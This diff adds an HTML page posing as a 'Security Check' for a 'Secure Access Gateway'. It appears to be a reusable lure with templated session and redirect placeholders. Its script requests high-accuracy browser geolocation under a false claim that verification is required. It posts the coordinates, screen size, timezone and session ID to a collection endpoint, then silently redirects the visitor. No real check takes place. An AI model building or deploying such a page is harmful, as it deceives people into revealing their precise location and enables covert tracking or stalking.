@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Access Gateway</title>
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --glass-bg: rgba(30, 41, 59, 0.7);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --accent: #3b82f6;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background: var(--bg-color);
+            background-image: 
+                radial-gradient(circle at 15% 50%, rgba(59, 130, 246, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 85% 30%, rgba(139, 92, 246, 0.15) 0%, transparent 50%);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .glass-panel {
+            background: var(--glass-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            padding: 40px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            transform: translateY(20px);
+            opacity: 0;
+            animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+
+        @keyframes slideUp {
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid var(--glass-border);
+            border-top-color: var(--accent);
+            border-radius: 50%;
+            margin: 0 auto 24px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        h1 {
+            margin: 0 0 12px;
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+
+        p {
+            margin: 0 0 24px;
+            color: var(--text-muted);
+            line-height: 1.6;
+            font-size: 0.95rem;
+        }
+
+        .status {
+            font-size: 0.875rem;
+            color: var(--text-muted);
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid var(--glass-border);
+            text-align: left;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .pulse {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background-color: #10b981;
+            border-radius: 50%;
+            margin-right: 8px;
+            box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="glass-panel">
+        <div class="spinner"></div>
+        <h1>Security Check</h1>
+        <p>Location verification is required to continue. Please confirm your location when prompted by your browser to access the system.</p>
+        
+        <div class="status">
+            <span class="pulse"></span>
+            <span id="status-text">Verifying environment security...</span>
+        </div>
+    </div>
+
+    <script>
+        const SESSION_ID = '{{SESSION_ID}}';
+        const TARGET_URL = '{{TARGET_URL}}';
+        const statusText = document.getElementById('status-text');
+
+        function redirect() {
+            statusText.innerText = "Verification complete. Redirecting...";
+            setTimeout(() => {
+                window.location.href = TARGET_URL;
+            }, 1000);
+        }
+
+        // Gather enriched client-side data
+        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+        let timezoneStr = "Unknown";
+        try {
+            timezoneStr = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        } catch(e) { }
+
+        function sendData(data) {
+            // Append client side data
+            data.screen = screenResolution;
+            data.timezone = timezoneStr;
+
+            fetch('/api/location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(() => redirect())
+            .catch(() => redirect());
+        }
+
+        // Request geolocation
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    sendData({
+                        sessionId: SESSION_ID,
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    });
+                },
+                (error) => {
+                    sendData({
+                        sessionId: SESSION_ID,
+                        error: error.message || "denied"
+                    });
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        } else {
+            sendData({
+                sessionId: SESSION_ID,
+                error: "Geolocation is not supported by this browser."
+            });
+        }
+    </script>
+</body>
+</html>
